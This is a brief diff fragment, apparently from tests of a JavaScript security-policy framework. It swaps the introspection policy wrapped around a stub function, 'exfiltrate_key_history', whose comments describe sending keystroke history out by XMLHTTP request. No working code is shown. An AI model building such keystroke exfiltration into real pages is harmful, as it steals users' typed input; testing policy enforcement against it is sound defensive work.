@@ -1,4 +1,4 @@
-introspect(JAMScript.introspectors.processAll) {
+introspect(JAM.policy.pFull) {
 function exfiltrate_key_history() {
 	// Try/Catch Error Handler
     // Exfiltrate data using XMLHTTP request
